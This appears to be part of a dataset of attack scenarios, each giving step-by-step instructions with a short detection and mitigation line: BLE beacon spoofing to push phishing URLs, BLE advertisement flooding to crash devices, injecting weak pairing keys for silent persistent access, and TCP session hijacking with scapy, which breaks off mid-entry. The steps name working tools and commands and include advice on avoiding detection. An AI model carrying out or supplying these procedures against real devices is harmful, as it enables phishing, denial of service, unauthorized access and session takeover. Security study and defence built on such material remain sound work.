Attack Steps: Step 1: Choose the beacon type to spoof: Apple iBeacon or Google Eddystone. iBeacon is typically UUID-based for location; Eddystone supports URLs. Step 2: Use a Linux system or Raspberry Pi with a compatible BLE adapter. Install bluez, and clone beacon_spammer.py or use hcitool commands. Step 3: For Eddystone, use beacon_spammer.py --url https://malicious-site.com to broadcast a phishing page. Nearby Android devices may display it as a notification. Step 4: For iBeacon, craft a spoofed UUID associated with a brand/store/location. Use command: sudo hcitool -i hci0 cmd 0x08 0x0008 ... to set beacon data manually. Step 5: Start advertising. Any device scanning for beacons (e.g., retail apps, museum guides, Google Nearby) may react to spoofed signals. Step 6: Victims may be lured to click phishing links or misled into believing they’re in a different location. Step 7: Stop advertising with hciconfig hci0 noscan or kill the script. Step 8: Logs from advertising can be saved for forensics.
Detection Method: Detect sudden appearance of new beacons; check beacon signature/expected location
Solution: Only trust signed beacons; validate source of proximity data; disable automatic notifications from BLE beacons

Title: DoS via BLE Flooding
Attack Type: Crash Device or Jam BLE via Advertisement Flood
Scenario Description: BLE devices can be flooded with excessive advertisements, connection requests, or malformed packets to jam, crash, or exhaust resources.
Attack Steps: Step 1: Use a Linux machine or Raspberry Pi with a powerful BLE adapter. Install tools like btlejuice, bleah, or bettercap (which includes BLE DoS modules). Step 2: Start scanning for BLE-enabled devices nearby. Confirm their MAC address and capabilities. Step 3: Use bleah spam -i hci0 to start flooding the BLE spectrum with fake advertisement packets from random MACs. This consumes scanning resources on victim devices. Step 4: Alternatively, use bettercap with ble.recon on and ble.flood on to spam multiple connection requests to the same target. Step 5: Devices may experience connection delays, freezes, or crash due to resource exhaustion (especially cheap or IoT BLE devices). Step 6: You can also use malformed packets (crafted via custom Python scripts or tools like GATTacker) to trigger protocol stack bugs. Step 7: Stop the attack after a few minutes to avoid detection. Step 8: Clean up by disabling your BLE adapter using hciconfig hci0 down. Reboot if stuck. Step 9: This attack is effective in conferences, retail stores, or any BLE-dense environment.
Vulnerability: Lack of rate limiting or BLE flood protection
Impact: Connection loss, app crashes, device lockup
Detection Method: Monitor for spike in BLE traffic; alert on excessive advertisements or connection attempts
Solution: Implement rate limiting on BLE stack; ignore invalid requests; use BLE 5.0+ with improved DoS resistance
Tags: BLE Flood, BLE Jam, Denial of Service

Title: BLE Pairing Key Injection
Scenario Description: An attacker intercepts or initiates BLE pairing and injects a known or predictable pairing key (TK or LTK), enabling future MITM attacks or reconnections without consent.
Attack Steps: Step 1: Understand how BLE pairing works — in legacy pairing, devices exchange Temporary Keys (TK), and in Secure Connections, keys are negotiated using DH key exchange. Step 2: Identify target BLE device using a scanner (hcitool lescan or bettercap's ble.recon on) and monitor pairing attempts (btmon or bettercap). Step 3: If legacy pairing is used, attacker can initiate the pairing process or act as a proxy (man-in-the-middle) between two BLE devices using btproxy or bettercap. Step 4: During pairing, inject a known TK value (e.g., all zeros or static key like 123456). Many poorly configured devices accept this key without user interaction. Step 5: Complete the pairing using injected predictable TK, while logging the Long Term Key (LTK) or session keys derived. Step 6: With LTK or encryption key stored, attacker can later reconnect to the BLE device silently (no re-pairing needed) and decrypt the traffic or impersonate the trusted device. Step 7: If acting as a proxy using btproxy, attacker can forward encrypted packets while maintaining full visibility. Step 8: Use gattacker to clone and control the device profile post-pairing. Step 9: Disconnect and try reconnecting silently to confirm persistent unauthorized access. Step 10: This attack is highly effective against fitness trackers, toys, BLE locks, and any device using Just Works pairing. Step 11: For cleanup, reset Bluetooth adapters (hciconfig hci0 down && hciconfig hci0 up). Always use test devices when experimenting.
Vulnerability: Acceptance of weak/default pairing keys (TK, LTK)
Detection Method: Monitor Bluetooth pairing events; log unexpected TK usage
Solution: Enforce authenticated pairing methods like Numeric Comparison; block use of predictable or zero TK values
Tags: BLE Pairing, TK Injection, MITM, Legacy Pairing

Title: TCP Session Hijacking
Attack Type: Inject forged ACK packets with correct seq #
Scenario Description: Attacker hijacks an ongoing TCP session by injecting packets with predicted or sniffed sequence and ACK numbers, taking over control of the session.
Attack Steps: Step 1: Monitor the target network using Wireshark or tcpdump to sniff ongoing TCP connections. Capture packets to learn IP addresses, ports, and sequence/ACK numbers. Step 2: Identify a target TCP session (e.g., client accessing admin panel via HTTP or telnet). Record source IP, destination IP, ports, and current sequence numbers. Step 3: Use scapy to craft and inject spoofed TCP packets with the same source IP and port as the client, using the current ACK and SEQ numbers from the sniffed session. Step 4: If sequence numbers are correct, the server accepts the spoofed packets as if they came from the legitimate client. Step 5: Inject commands (e.g., HTTP GET or POST, shell commands in telnet) directly into the session using scapy or a custom Python script. Step 6: The attacker now fully controls the session — the client may continue sending but will become desynced or disconnected.
